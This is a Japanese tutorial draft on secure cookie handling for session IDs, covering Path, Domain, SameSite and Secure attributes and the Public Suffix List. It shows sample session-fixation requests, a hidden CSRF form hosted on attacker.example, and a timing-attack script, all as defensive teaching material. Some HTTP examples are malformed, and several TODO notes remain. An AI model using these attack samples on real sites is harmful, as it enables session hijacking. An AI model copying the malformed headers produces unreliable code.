---
title: "Cookie の属性と適切な処理"
emoji: "📝"
type: "tech"
topics: ["cookie", "web"]
published: false
---

# Cookie の属性と適切な処理

前節では Cookie の基本的な挙動と、 Credential としての重要性を解説した。ここからは、 Session ID としての用途に注目し、実装上考慮すべき点について解説していく。


## Cookie の仕様

まず Cookie の仕様についてだが、前節でも紹介したとおり最新の RFC として RFC6265 がある。

- [RFC 6265 - HTTP State Management Mechanism](https://tools.ietf.org/html/rfc6265)

しかしこの仕様も 2011 年に公開されたもので、その後に提案された新しい仕様や変更点も有り、それらは RFC6265bis という新しいドラフトで作業がされている。

- [draft-ietf-httpbis-rfc6265bis - Cookies: HTTP State Management Mechanism](https://tools.ietf.org/html/draft-ietf-httpbis-rfc6265bis)

執筆時点では draft-06 であり、これが今後も更新され、最後には RFC6265 の改訂版として RFC になるだろう。この改訂仕様の中には、すでにブラウザに実装されているものもあり、これから Cookie の利用を考える上で把握しておくべき内容だ。したがって以降は 6265bis を踏まえたうえで解説していく。


## Session ID の要件

まず Session ID として付与する場合に適切な値を考えると、ランダムで予測されず使い捨てられる一意な値(Nonce)であるべきことが前節の解説からもわかるだろう。

HTTP の Cookie の仕様はあくまで Cookie の挙動を定義したものであり、「どんな値を付与するのが安全か」は仕様の範囲外だ。そうした場合に参照できるドキュメントとして OWASP がある。

- [Session Management - OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)

ここには、以下のような要件が書かれている。

- 最低でも 16byte 以上の長さ
- 暗号的に安全な乱数生成器で生成
- 一意性の担保
- etc

逆を言うとこうした要件を満たさない、短くて推測が容易な値を使ってしまうと、攻撃者が総当りで Cookie を付与したリクエストを送り(Bruteforce Attack)、たまたま本物に行き当たることで、その Session を盗む(Session Hijack)ことができてしまう。

しかし、通常 Session ID は開発者が自分で生成するのではなく、フレームワークなどが適切な値を生成し、多くの場合は自動で付与する作りになっているだろう。そうした信頼できる実装に管理を任せ、自分で生成ロジックを考えて実装するといったことは基本的にするべきではない。

:::details OWASP とは
OWASP(Open Web Application Security Project) は、主にセキュリティに関する普及と啓蒙をする団体であり、 Web セキュリティのベストプラクティスをまとめたチートシートを公開している。 Session Management 以外にも色々書かれているので、 Web 開発者なら一読しておきたい。また将来的にこの本と OWASP のガイドで内容が食い違ったりしたら、 OWASP に従うべきだろう。

- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org)

また、 Cookie を Credential とする点で認証認可の話も切り離せないものとなる。その場合は NIST が参考になるだろう。

NIST(National Institute of Standards and Technology) は、アメリカで多岐に渡る分野の技術標準の策定などをしている。その内容は、政府に収めるシステムが満たすべき要件として使われたりもする権威あるもので、内容も利用者の安全(ひいては国防)を守る観点でかなりきちんと書かれている。認証認可に関するものは以下だ。

- [NIST Special Publication 800-63-3](https://pages.nist.gov/800-63-3/sp800-63-3.html)

他にも IPA はじめ多くの組織がガイドラインやチェックリストを出しているが、少なくともこの 2 つだけは覚えておくと良いだろう。日本語訳も探せば出てくるが、翻訳の鮮度を確認してから読むことをオススメしたい。
:::


## Cookie にまつわる攻撃

適切な Session ID を生成できれば、それを Cookie に付与すれば Session が維持できる。


```http
Set-Cookie: session_id=YWxpY2U
```

そしてこの値は攻撃者の手に渡れば、攻撃者は Session を盗む(Session Hijacking)ことができることを意味するため、サービスにおいて Session 機能を提供するのであれば、この Session ID は死守しなければならない。

攻撃者が Session Hijack を成立させるには、大別して二つの方法が考えられる。

- なんらかの方法で正規の Cookie を盗み出す
- なんらかの方法で偽装した Cookie を埋め込み(Cookie Injection)それを Session に紐づける(Session Fixation)

前者は、盗み出せた時点で Session Hijack が成功している。後者は Cookie Injection が成立したらすぐに Session Hijack に繋がるとは限らず、それを Session ID として正当化する Session Fixation が成立すると Session Hijack が成功するというイメージだ。

また Cookie Injection は、 Session ID 以外の Cookie が存在した場合、そこにも直接的な影響がある。例えば、前節の 「Cookie を用いたカート実装」をしていた場合、 Cookie Injection によってカート自体を改竄し、意図しない買い物をさせることもできるかもしれない。

以上のことを踏まえた上で、 Cookie の適切な扱いを解説するとともに、「Cookie が本来いかに信用ならないものなのか」をみていこう。


## Session ID 付与のタイミング

前節で解説した通り、 EC サイトなどではログインする前からカートに商品を追加でき、決済の直前でユーザ認証が行われるようなフローがよくある。

カートの有無に限らずどんなサービスでも、最初のアクセスで Session ID をまず付与し、 Session を区別できるようにするのが一般的だ。


```http
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 1024
Set-Cookie: session_id=YWxpY2U

<!doctype html>
...
```

買い物が終わり決済をするためには、ユーザ認証を行いセッションとアカウントを紐づける。


```http
POST /login HTTP/1.1
Host: example.com
Content-Length: 32
Cookie: session_id=YWxpY2U

username=alice&password=xxxxxxxx
```

これにより `session_id=YWxpY2U` が Alice だと判明するため、この Session に Alice のアカウントを紐付ければ良いという解説をした。

しかし、このまま **単純に `YWxpY2U` に Alice を紐付ける実装には大きな落とし穴がある** ため注意したい。


### Session Fixation

もし Alice が送ってきた session_id が、サーバによって付与されたものではなく、悪意のある攻撃者によって Alice のクライアントに埋め込まれた値だったら、つまり Cookie Injection 成立していたらどうなるだろうか?

まず攻撃者は、サービスにアクセスし session_id を受け取る。


```http
GET / HTTP/1.1
Host: example.com
Content-Length: 256
Set-Cookie: YXR0YWNrZXI

<!doctype html>
```

この Session ID をなんらかの方法で Alice のクライアントに付与し、 Alice に認証をさせる。


```http
POST /login HTTP/1.1
Host: example.com
Content-Length: 32
# 攻撃者によって埋め込まれた値
Cookie: session_id=YXR0YWNrZXI

username=alice&password=xxxxxxxx
```

認証が正しく行われたことで、この `session_id=YXR0YWNrZXI` をその後 Alice と扱ってしまうと、埋め込んだ攻撃者はこの session_id の値を知っているため、認証が通った直後に Alice に成り済ますことができてしまう。


```http
# 攻撃者は Alice になりすませる
GET /accounts HTTP/1.1
Host: example.com
# Alice により認証された Session ID
Cookie: session_id=YXR0YWNrZXI
```

このように、攻撃者により Inject された Cookie にアカウントを紐付けさせるこの攻撃を **Session Fixation** と呼ぶ。


### Session Fixation 対策

Session Fixation への対策は知られており、「 **認証が終わったら session_id を再生成する** 」ことで防ぐことができる。 Alice の Session ID を更新してしまえば、攻撃者は新しい Session ID を知らないため、なり済ませないからだ。

しかし、それだけでは認証する前の Session Fixation は防げず、 Alice がカートに追加した内容は攻撃者に見えてしまう。もし認証前でもカートへの追加を許可し、それを Session Fixation から守るには、カートに追加するたびに Session ID を再生成するといった方法が考えられる。しかし、個人情報などを扱う前には必ず認証を挟むことが推奨され、カートへの追加も認証後でないとできないようにしている EC サイトもある。

「Alice のクライアントに任意の Cookie を保存するなんてできるのか?」と思うかもしれないが、それがどう可能かは後ほど解説する。先に言っておきたいのは(近年は昔よりは良くなりつつ有るが) Cookie Injection を完璧に防ぐことは簡単ではないこと、もっと言えば **クライアントが送ってくる Cookie は基本的には信用ならない** ということだ。よって Cookie Injection が起こっても、 Session Fixation につながらなように対策することが必要だ。

OWASP のガイドでは、「権限レベルが変わったら」 Session ID を再生成すべきといった書き方をしているが、わかりやすく言うなら、サービスを作る中で「ここから先ユーザが処理を進めたとき、もし Session Fixation が発生していたらまずいな」と思う場面では再度認証をはさみ、そのタイミングで Session Cookie を再生成しておくと良いだろう。大手のサービスで重要な操作(パスワーの変更 etc)の前に再度認証を挟む実装をよく見ると思う、どこで認証を挟んでいるかに注目してみると参考になるだろう。

:::message alert
Cookie はサーバが付与し、サーバが知らない Cookie を勝手に送っても無視される、と普通なら思うだろう。驚くことに、世の中には「クライアントが送ってきた Cookie でサーバが知らない値でも、それをその後の Session ID として使ってしまう」という実装が存在することが知られている(Session Adoption)。
また、昔は Cookie 非対応なガラケーブラウザや、対応してても設定で無効にしているユーザが存在し、そうしたユーザでも Session を確立するために Session ID を Cookie ではなく URL のパラメータに入れるという実装も存在した。
これらが組み合わさると、適当な Session ID を生成し、それをパラーメタに付与したリンクを対象者に踏ませれば、 Session Fixation は簡単にできてしまうことになる。
フレームワークを選定する際は、こうした Session の扱いは一度把握しておくと良い。特に古いフレームワークなどでは注意が必要だ。
:::


# Cookie の属性

ここまでの話で Credential としての Session Cookie は以下のようになることがわかる。


```http
Cookie: session_id=YWxpY2U
```

ここからは、この値に付与する属性を見ていこう。


## Path 属性による範囲指定


### Path 属性の設定

Cookie には Path という概念がある。例えば前節のように、認証のためのログインフォームが `/login` だったとする。


```http
POST /login HTTP/1.1
Host: example.com
Content-Length: 32

username=alice&password=xxxxxxxx
```

サーバは以下のようなレスポンスで Cookie を付与する。


```http
201 Created HTTP/1.1
Content-Length: 256
Content-Type: text/html
Set-Cookie: session_id=YWxpY2U

<!doctype html>
...
```

このとき、 `session_id` Cookie の Path は、デフォルトでリクエストした URL の Path つまり `/login` になり、ブラウザはこの Cookie を `/login` 以下の Path にしか送らない。従って、 `/` や `/cart` などのリクエストにこの Cookie は載らないため、このままではカートの識別は実現できない。

基本的に、 Session ID はサイト全体で利用することになるため、明示的に Path 属性にルートパスを指定するのが通常だ。


```http
Set-Cookie: session_id=YWxpY2U; Path=/
```

この設定が基本となる。逆を言うとこの Path を細かく分けるような実装が必要な場合は、設計自体が問題を抱えている可能性もある。その理由を解説していく。


### Path 属性の注意点

Path 属性は送信先を制限するものなので、セキュリティの観点から送信範囲を限定するために使うものと思うかもしれないが、その理解は半分危険だ。

例えば、 1 つのドメイン example.com 以下に、パスを区切って別々のユーザが好きなサービスを提供できるようなサービスがあったとしよう。

- https://example.com/alice : Alice が管理するサービス
- https://example.com/bob   : Bob   が管理するサービス

`/alice/login` には認証フォームがあり、ログインしたユーザに Cookie を付与する。この Cookie の Path を `/` などにしてしまっては `/bob` にも送られてしまうため、 Path を絞っているとしよう。


```http
# /alice からのレスポンス
Set-Cookie: session_id=YWxpY2U; Path=/alice;
```

これで Cookie は `/alice` にのみ送られ `/bob` には送られない。しかし `/bob` はこの Cookie を盗めなくても改竄はできる。

`/bob` のどこかで以下のようにレスポンスを返せば良い。


```http
# /bob からのレスポンス
Set-Cookie: session_id=bad-cookie; Path=/alice;
```

すると、 `/alice/login` で付与された正規の Cookie は Bob によって上書きされ、ブラウザは `/alice` に対してこの値を送ってしまうのだ。


```http
# /alice に送ってしまう
Cookie: session_id=bad-cookie
```

Bob は、 Alice のサービスのユーザに任意の Cookie を埋め込む Cookie Injection を成立することができた。 Path 属性は「どこに送るのか」を制限するだけなのでこの攻撃に無力だ。 Cookie はそもそも「 **どの Path で付与されたか** 」という情報は持たないため、 Alice はそれが「 **確かに自分が付与したものか、攻撃者に埋め込まれたものか** 」を判断できないのだ。

Cookie に Session ID ではなく直接的な値があれば、それをそのまま改竄できる。 session_id の場合は、 Inject されたものを Alice のサービスが認証後も継続して使ってしまうと、そこで Session Fixation が成立してしまう。

つまり、「 **Cookie において Path は Origin のようなセキュリティの境界にはなりえない** 」ため、 Path ごとに Credential が別になる(つまり認証が違う)サービスを同居する構成はとってはならないのだ。

結果サイト全体で同じ Credential を使うことになり、 Path は基本 `/` となる。

:::details レンタルサーバというユースケース
Alice と Bob が同じドメインの別のパスで別のサービスを提供するなんて普通しないだろ、と思うかもしれない。確かに今となっては普通はしない。しかし、クラウドよりも以前にあった「レンタルサーバ」と呼ばれていたサービスではこうした構成は存在した。 1 つの Linux サーバに複数の Linux User が作られれ、それぞれの Home ディレクトリ以下が HTTP サーバによって公開されている構成だ。

その場合 Alice / Bob のホームディレクトリは `~alice` `~bob` となるので、 URL も http://example.com/~alice や http://example.com/~bob となる。 Home 以下は好きにしてよいが sudo も使えないため、主に静的な HTML ファイルを置いたり、 CGI による掲示板を設置したりという用途が主流だったようだ。

今ではユーザごとに VM が割り当てられ、何かをデプロイするにしても最低でサブドメインくらいは振られるのが主流なため、こうした構成のサービスはあまり使われなくなった。しかし、 Web の黎明期にはそうした構成が実在した以上、仕様を考える上で無視はできない。

仕様を読みながら「なんかよくわからない状況を前提に書かれているけど、そんな前提そもそも無いのでは?」と思った場合、「今はない」だけで「昔はあった」かもしれないという点には注意が必要だ。
:::


## Domain 属性による範囲指定


### Domain 属性の設定

example.com から付与された Cookie は、デフォルトでは example.com にしか送られない。

しかし以下のように Domain 属性を指定すると、 example.com だけでなくそのサブドメインにも Cookie が送られるようになる。


```http
Set-Cookie: session_id=YWxpY2U; Path=/; Domain=example.com
```

この属性も、まるで送信範囲を明示的に制限しているように見えるが、 **挙動が直感的ではない** ため注意が必要だ。

- Domain 属性を設定しなければ example.com にのみ送られる
- Domain=example.com を付与すると example.com のサブドメインにも送られる

つまり、 Domain 属性を付与することは、送られるドメインを制限するのではなく、むしろ広げていると言うことができる。指定しないほうが送信される範囲が狭いのだ。


### Domain 属性の注意点

今度は、 example.com 以下の alice.example.com に Alice が管理するサービス、 bob.example.com に Bob が管理するサービスがデプロイされ、それぞれが認証を提供するような構成を考える。

alice.example.com で認証したレスポンスで以下の Set-Cookie が返ってきたとしよう。


```http
# alice.example.com からのレスポンス
Set-Cookie: session_id=YWxpY2U; Path=/; Domain=example.com
```

すると、この Cookie は bob.example.com にも送信されてしまうため、 Session ID の漏洩が発生し、 Bob は Alice のサービス利用者に成り済ますことができてしまう。

さらに Alice が Domain 属性をつけていなかったとしても、 Bob は以下のようなレスポンスを Alice のユーザに返すことで、 Cookie Injection を行うことができる。


```http
# bob.example.com からのレスポンス
Set-Cookie: session_id=bad-cookie; Path=/; Domain=example.com
```

この Cookie を持つユーザが alice.example.com にアクセスすると、 Bob が仕込んだ session_id を送る。この session_id を Alice のサービスが認証後も継続して使ってしまうと、ここでも Session Fixation が発生してしまう可能性があるのだ。

Path 属性の時と同様、 Cookie ヘッダは「 **どの Domain で付与されたか** 」という情報を持たないため、「 **自分のドメインで付与されたものか、他のドメインで付与されたものか** 」を判断できない。このことからも、 **TODO: サブドメイン間でそれぞれ認証や権限レベルが違う** といった構成を取るのは推奨されない。

結果として Session Cookie には **Domain 属性は付与しない** のが推奨されており、もしサブドメイン間で Session や Session 以外の Cookie を共有したい場合などは、別途共有方法を考えるのが理想となる。


```http
# ここまでの理想の設定(id は短くしている)
Set-Cookie: session_id=YWxpY2U; Path=/;
```

:::details Cookie の構成の推奨?
サブドメインを複数組み合わせてサービスを提供するのも、それらが認証情報を共有すのもわりと一般的だ。かつその構成はサービスによってまちまちなので、どういう Cookie に設計するのが良いのかという一般解は示すのが難しい。
現実には Domain 属性を設定しているサービスも多いが、それら全てが脆弱な作りかと言うと必ずしもそうではない。結局は、属性の性質を正しく理解し、リスクを踏まえた上で、サービスごとに解を見つけていくしか無い。つまりケースバイケースという話にしかなりえない。

本書では、そうした「ケースバイケースである」というわかりきった話ではなく、その「ケース」について考えるために踏まえるべき解説を、なるべく多く盛り込んでいきたい。
:::


## Registrable Doamin と Public Suffix List

`Domain=example.co.jp` とすると example.co.jp のサブドメインに Cookie が送られるという解説をしたが、ここで `Domain=co.jp` と指定したとしても *.co.jp に送られるわけがないと思うだろう。しかし、実は似たようなことが実際に発生したことがある。

日本には都道府県型 JP ドメインというものがあり、例えば tokyo.jp のサブドメイン example.tokyo.jp を取得することができる。その example.tokyo.jp から IE に対して `Domain=tokyo.jp` な Cookie を付与することができたのだ。これは Cookie Monster バグと呼ばれている。

単なる IE のバグだと考えればそれでもいいが、そもそもなぜこうしたことが起こったのかは、そもそもの「Domain」というものが、どう定義されどう運用されているかを一度知っておくと良いだろう。その考え方は今後も重要になる。


### Top Level Domain と Registrable Domain

例えば `.jp` について考えてみよう、 `.jp` は Top Level Domain (TLD) と呼ばれ、我々は `.jp` のサブドメインにあたる部分をドメインレジストラから購入することができる。ここでは例示ドメインだとややこしいので `${好きな単語}.jp` のようなイメージで考えて欲しい。そして、この購入できるドメインを Registrable Domain という。

一方、末尾が `.co.jp` なドメインもあり、 `${好きな単語}.co.jp` も取得できる。 `co.jp` というドメイン自体は取得できず、単にこれを `.jp` のサブドメインと扱うことはできない。つまり、ドメインは `.` で分けたとき最後が TLD でそこに単語を足せば Registrable Domain になる。というほど簡単ではない。そして最後がどういう組み合わせだと取得できなくて、どうなっていれば取得できるのかは、ドメインの運用によってバラバラなのだ。

都道府県型 JP ドメインを考えると、 `${好きな単語}.jp` は取得できるが、 `tokyo.jp` は取得できず、 `${好きな単語}.tokyo.jp` は取得できる。これは `tokyo.jp` をレジストラがそう運用しているからという、仕様ではなく運用の都合なのだ。


### Effective Top Level Domain と Public Suffix List

これはつまり、 `tokyo.jp` はまるでその組み合わせを Top Level Domain のような扱いをしないといけないことを意味する。そうしたドメインの組み合わせを Effective Top Level Domain (eTLD) と呼ぶ。

この eTLD は何度も言うように機械的に決まっているわけではなく、レジストラの運用次第なので、ドメインを見ただけではわからない。従って Cookie でも Domain 属性に `Domain=tokyo.jp` と書いてあったとき、これが正規に取得されている `.jp` の Registrable Domain を指定しているのか、そうではないのかがブラウザにはわからないのだ。

そこで Mozilla は、「どの組み合わせが eTLD として運用されているのか」を独自に集めてファイルに並べ、ブラウザにそれを読み込んでドメインのパースに使っていた。そのリストは Mozilla 以外のソフトウェアにもニーズがあるため、今はコミュニティ手動でオープンに管理されている。このリストを Public Suffix List(PSL) と言う。(今は [github](https://github.com/publicsuffix/list/blob/master/public_suffix_list.dat) でも公開されている)

- [Public Suffix List](https://publicsuffix.org/)

ページ冒頭の解説にあるように、 Cookie 以外にも、ブラウザが「履歴をドメインごとに並べる」「URL バーで重要なドメインを表示する」などの用途で使用するとされている。

しかし、この PSL が Mozilla 発だったように、他のベンダも独自に PSL 相当のリストを持ちメンテナンスしていた。 Microsoft も独自に保持し、そこには「`tokyo.jp` がレジストラでどう運用されているのか」、が正確に反映されていなかったというのが Cookie Monster バグの実態と考えられる。

現在 Chrome も PSL を使い、 IE も 2014 年の [Windows 10 Technical Preview](https://mspoweruser.com/microsoft-brings-interoperable-top-level-domain-name-parsing-internet-explorer/) から PSL を見るようになった。 PSL には `.tokyo.jp` が eTLD であることが記載されているため、このバグは最新のブラウザでは治っているのだ。(PSL を見てない古いブラウザについては注意が必要)


### PSL Amendments

都道府県型 JP ドメインも、かつては地域型 JP ドメインという、[違う運用](https://internet.watch.impress.co.jp/docs/news/523403.html)がされていた。そうした運用の変更について、レジストラは PSL に更新を要求(PSL Amendments Request)するべきであり、おそらくまともなレジストラはそれを行っている。もし不安なら、ドメインを取る前に PSL を確認してみるのがいいだろう。

そして、運用にルールを課しているのはレジストラだけではない。たとえば、サブドメインに任意のサービスをデプロイできる [heroku](https://heroku.com) や [glitch](https://glitch.me) といったサービスは、自身が所有するドメインを eTLD のように扱い、ユーザにサブドメインを付与していると言える。そして、そのユーザがサブドメインにデプロイした Cookie は `Domain=herokuapp.com` や `Domain=glitch.me` などが設定できると問題が生じる可能性があるのだ。そこで、こうしたサービスも PSL に申請しており、実際にエントリが登録されている。

もし、自身の所有するドメインのサブドメインをユーザに提供し、そこで Cookie が付与できるようなサービスがデプロイ可能な状態になるならば、 PSL への登録を行うべきである可能性もあるため検討が必要だ。

なお、例えば heroku が持っている `heroku.com` 自体を登録してしまうと、 heroku.com 自体の Cookie が使いにくくなるという問題があるため、ユーザのアプリがデプロイされるのは別ドメイン `herokuapp.com` になっている(glitch の場合 glitch.com に対して glitch.me)。自身で同様のサービスを運用するなら、サブドメインを付与するための別ドメインを用意するよう、予め考えてから設計すると良いだろう。

:::details eTLD+1
つまり、通常サービスが運用される単位は eTLD の左に一階層付与したドメイン、例えば `${好きな単語}.${eTLD}` となる。これを **eTLD+1** と表現することがある。

そして、(少なくとも Cookie の仕様では) Registrable Domain == eTLD+1 だ。

しかし、先の例で言う herokuapp.com や glitch.me は(サービス運用者が取得したように) Registrable Domain だが実運用上 eTLD+1 ではないため、そのあたりを意識してあえて eTLD+1 と使い分ける場合もあるように思う。
:::


## SameSite Cookie

[Origin 解体新書](https://zenn.dev/jxck/books/origin-anatomia) でも解説したように、 Cookie は Same Origin Policy に準拠しておらず、 Origin をまたいだリクエストでも送られる。


### CSRF 攻撃

例えば、 blog.example で付与された Cookie を持ったブラウザは、攻撃者が用意した attacker.example の `<form>` からのリクエストに Cookie を付与してしまう。


```html
<!-- 攻撃サイト内にある隠し投稿フォーム(簡略) -->
<form action=https://blog.example/entries method=post>
  <input name=title type=hidden value=${嫌がらせのタイトル}>
  <input name=body  type=hidden value=${嫌がらせの本文}>
  <button type=submit>今すぐここをクリック!!!</button>
</form>
```


```http
POST /entries HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 256
Cookie: session_id=YWxpY2U

title=${嫌がらせタイトル}&body=${嫌がらせ本文}
```


### Timing 攻撃

次は、 SNS におけるブロック機能を考えてみよう。攻撃者は、 Alice が誰をブロックしているかを調べたいとする。

そこで攻撃者は Alice を以下のような JS を仕込んだサイトに誘導する。


```js
function timing_attack(username) {
  const img = new Image()
  const t1 = performance.now()
  img.onerror = () => {
    const t2 = performance.now()
    // block していれば速く
    // block していなければ遅い
    console.log(t2-t1)
  }
  img.src = `https://sns.example.com/#{username}`
}
```

この JS は、 SNS のユーザごとのページを取得し、その取得にかかる時間を調べる。 Alice が SNS にログイン済みであればリクエストには Cookie が付与され、 Alice がブロックしていれば定形画面が返り、ブロックしていなければそのユーザのタイムラインが取得される。

取得結果自体を見ることはできないが、通常ユーザのタイムラインを取得する方が、ブロックの定形画面よりも速いため、ユーザを変えならが取得をすればブロックしているユーザがわかってしまう。これが Timing Attack の基本的な発想だ。 2018 年には、実際に Twitter で発見され[Silhouette(シルエット)攻撃](https://blog.twitter.com/engineering/en_us/topics/insights/2018/twitter_silhouette.html)と呼ばれた。

この攻撃は、 GET によるアクセスのため、 CSRF のように Token を付与することも難しく、ブロックされている場合でも、されていない場合と同程度にレスポンスを遅延させるといった方法でしか対処することが難しい。


### Same Site / Cross Site

SameSite 属性は、「異なる Site へのリクエストに Cookie を付与するかどうかを制御する」ための属性だ。

なぜ SameOrigin 属性じゃないかと言うと、ここまで解説したように Cookie は Origin の概念が生まれる前からあり、 Domain の設定によってサブドメインにも送られるような仕様になっている。また、 Scheme や Port にも縛られていないため、 http ページから https ページへのリクエストや、他の Port へのリクエストにも付与される。

TODO: Cookie が Origin に閉じないこと別途節立てするか

そこで、従来 Cookie に設定できた範囲を括る Site という概念を定義し、その Site が同じであれば送られるといった仕様を追加したのだ。 Site は先に解説した eTLD+1 を基本とし、そのサブドメインを Scheme / Port を無視してくくる。

例えば、 https://example.com に対して以下は全て SameSite だ。

- http://example.com
- https://intra.example.com
- https://wiki.intra.example.com
- https://example.com:3000

それ以外を CrossSite と呼ぶ。

TODO: schemeful same site


### SameSite 属性

SameSite 属性には 3 つの値がある。

- Strict
- Lax
- None

まず、以下のように Strict を付与すると、その Cookie は SameSite へのリクエストにしか送られなくなる。


```http
Set-Cookie: session_id=YWxpY2U; SameSite=Strict;
```

この設定ならば CSRF 攻撃や Timing 攻撃の発生は、ほとんど防ぐことができる。

:::message alert
大抵そうした攻撃は、攻撃者の用意した Cross Site なページから来るため効果があると言っているのであって、もし攻撃者が XSS やその他サイト改竄を組み合わせて SameSite なページに攻撃を仕込める場合は別だ。基本的には自身がコントロールできない CrossSite からの攻撃を防ぐ手段であり、自身のコントロール下にある SameSite に脆弱性がある場合は、それを治す以上の対策は無い。
:::

しかし session_id にこれをつけてしまうと、例えば alice.example から bob.example への「 **ページ遷移** (Top Level Navigation)」でも Cookie が付与されなくなるため、ログインしてないとみなされてしまう。そして、そのページでリロードするだけで Cookie が付与されログイン状態になるという変な挙動になる。

そこで、 Top Level Navigation の場合にのみ CrossSite からも Cookie を送り、 Form からの POST や、画像などサブリソースへのリクエストには付与しないよう緩和した設定が Lax だ。


```http
Set-Cookie: session_id=YWxpY2U; SameSite=Lax;
```

安全側に倒す目的で、 Cookie の設定をデフォルトで Lax にするブラウザもある。この場合 Set-Cookie に明示的に SameSite が付与されていなくても自動で Lax と扱われるため、多くの攻撃が未然に防がれる。

:::message
ブラウザが Lax をデフォルトにすると Cross Site サイトにも Cookie が自動で送信されていることを前提に作られていたサイトは、壊れてしまう場合がある。これを防ぐためには、サイトをまたいでも自動で送ってほしい Cookie に対し明示的に None を付与することで、これまでの挙動を維持することも可能だ。
(この場合 SameSite=None にする条件として Secure の併用を必須とすると言った条件をつけることで、 Cookie の設定をより安全に倒すように制限されているケースがある。)

```http
Set-Cookie: session_id=YWxpY2U; SameSite=None;
```

しかしこれはあくまで移行のための手段であり、最終的には Lax をデフォルトとして考え、どうしても Cross Site での連携が必要な場合は次節で解説するその他適切な API へと移行していく流れが続くだろう。とくに新規にサービスを作る場合はそれらを意識して設計するべきだ。
:::


### Read Cookie と Write Cookie

`SameSite=Strict` にすれば、 Cross Site な Cookie の送信が一切発生しなくなるため、かなりの安全が期待できる一方、他のページから遷移したときの Session も維持されなくなるため、単純な導入には注意が必要だ。そこで、 RFC6265bis では Strict を導入する際の方法について言及があるので紹介する。

まず、ユーザの操作を "read" と "write" で分け、それぞれの権限が別の Cookie によって付与される構成にする。具体的には POST などによる副作用が発生するもを "write" そうでないものを "read" としてカテゴライズし、それぞれを行うために Cookie も 2 つに分ける。そして "write" Cookie のみ Strict にし、 "read" Cookie については Lax にするというものだ。


```http
Set-Cookie: read_cookie=cmVhZA;   SameSite=Strict; Path=/; Secure; HttpOnly
Set-Cookie: write_cookie=d3JpdGU; SameSite=Lax;    Path=/; Secure; HttpOnly
```

画面遷移やそれに必要なサブリソースの読み込みなどは read cookie のみで行うことができ Lax によって送信されているため Session が切れることはない。`<form>` を用いた POST などは write cookie を必要とし、 `<from>` が SameSite にあるため Strict でも送られる。そして read cookie は有効期限を長く設定し、時間を開けてユーザが戻ってきてもログイン状態を維持する一方、 write cookie は有効期限を短くし、 Cookie が無ければ再度認証を挟むようにすれば、権限操作の前のユーザ確認が実施できるという方法だ。

この方法は安全性は高い一方 Cookie の責務を 2 つにわけるため、 Session Cookie 一つで成り立っていたサイトや、それを前提に作られたフレームワークにも変更が必要になるため、エコシステム側がそれに対応しない限り導入の障壁は多少高いと言えるだろう。一方で、 Lax Cookie が飛ぶ操作に write な操作が入らない作り、つまり副作用の発生する GET などが無い作りであれば、単一の Session Cookie を Lax にするだけでも十分に安全性は向上しているとも言えるだろう。

結果、 SameSite が始まったばかりの現状では、 read/write で Cookie を分ける構成が一般的とは言えず、これが本当に主流になっていくかは判断ができないこと、そしてそこまでする必要がどの程度あるかというリスク評価も定まってないため、筆者としてもこれを推奨構成とする意図は今のところ無く、あくまで紹介に留める。

:::message
ちなみにだが、 Github は早い段階からこの read/write cookie の分離を実施している。

(将来的に OWASP などの推奨になったりすれば、この部分はまた更新したいと思う)
:::


## Secure 属性と HTTPS への制限


### HTTPS 化による Credential の保護

前節で解説したように、 Credential としての Cookie が盗まれると、 Session Hijacking が成立する可能性がある。そして、 Person in the Middle などの攻撃が成立した場合、平文の HTTP 通信は簡単に盗聴されてしまう。したがって、 Cookie を用いた通信は暗号化するべだと言える。

現在のように HTTP Everywhere が普及する前は「パスワードを送信するページだけ暗号化する」などというポリシーがまかり通っていた時代があるが、パスワードだけを暗号化しても、その後アカウントが紐付いた Session ID が盗まれれば被害は防げない。基本的には全ての URL を暗号化するのが前提だ。

:::message alert
現在、全てのページを暗号化すべき(HTTP Everywhere) と言われているのは、「Session ID を保護するため」という理由だけではなく、それは理由の一部にすぎないという点には注意したい。ではなぜ全部暗号化するのかについては、別途解説したい。
:::


### Secure 属性

サービスを `https://` に対応しても、ブラウザに `http://` なリンクを踏ませることができれば、平文リクエストが発生し Cookie が盗聴される可能性がある。

そこで、経路を暗号化した上で Cookie に `Secure` 属性を付与することで、その Cookie は `https://` へのリクエストでしか付与されなくなる。これによって、 `http://` のリンクを踏ませることができても、 Cookie が平文で送信されて盗聴によって盗まれることは基本なくなる。したがって、 Credential となる Session Cookie には Secure 属性の付与を必須だと考えるべきだ。


```http
Set-Cookie: session_id=YWxpY2U; Path=/; Secure;
```

逆を言えば、 session_id は `http://` なリクエストには付与されなくなるため、 Session が維持できなくなる(ログイン状態ではなくなる)。従って、全ての `http://` リクエストを `https://` にリダイレクトすることで Session を安全に維持することになる。

このとき、サービスを HSTS に対応すれば、 `https://` へのリダイレクトはブラウザにキャッシュされる。[^1]

[^1]: HSTS についての詳細は別章で解説


```http
# http リクエスト
GET / HTTP/1.1
Host: example.com
# Cookie が付与されない
```


```http
# https に恒久的リダイレクト
308 Permanent Redirect HTTP/1.1
Location: https://example.com
```


```http
# https リクエスト
GET / HTTP/1.1
Host: example.com
Cookie: session_id=YWxpY2U; Path=/; Secure;
```


```http
200 OK HTTP/1.1
Set-Cookie: session_id=YWxpY2U; Path=/; Secure;
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

これにより、サービスとの通信が暗号化され、 Cookie の暗号化された経路でしか送られなくなる。


### Secure Cookie の Injection

しかし、`Secure` 属性をつければ終わりかと言うとそうではない。攻撃者は、盗聴によって Cookie を盗むことができなくても、改ざんすることは不可能ではない。

先の例では、最初に `http://` でアクセスし、それを `http://` にリダリエクとして初めて暗号化が始まった。リダイレクトするまでは平文だ。これを利用して、例えば以下のようにレスポンスに `Set-Cookie` を仕込むことができる。


```http
# http リクエスト
GET / HTTP/1.1
Host: example.com
```


```http
# https に恒久的リダイレクト
308 Permanent Redirect HTTP/1.1
Location: https://example.com
Set-Cookie: session_id=bad-cookie; Path=/; Secure;
```


```http
# https リクエスト
GET / HTTP/1.1
Host: example.com
Cookie: session_id=bad-cookie; Path=/; Secure;
```

ブラウザはこの Cookie をそのままリダイレクト後にサーバに送ってしまう。ため、ここでも Session Fixation が発生する可能性があるのだ。 Cookie ヘッダは `http://` と `https://` どちらで付与されたかという情報を持たないため、サーバはこれが自分で付与した正規のものなのか、改ざんされた Cookie なのかを見分けることはできない。

